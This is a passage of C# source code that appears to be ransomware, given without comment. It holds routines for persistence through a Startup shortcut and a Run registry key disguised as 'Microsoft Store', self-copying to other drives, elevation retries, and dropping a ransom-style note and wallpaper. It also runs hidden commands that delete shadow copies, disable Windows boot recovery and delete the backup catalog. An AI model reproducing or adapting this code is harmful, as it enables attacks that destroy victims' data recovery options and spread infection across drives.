				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
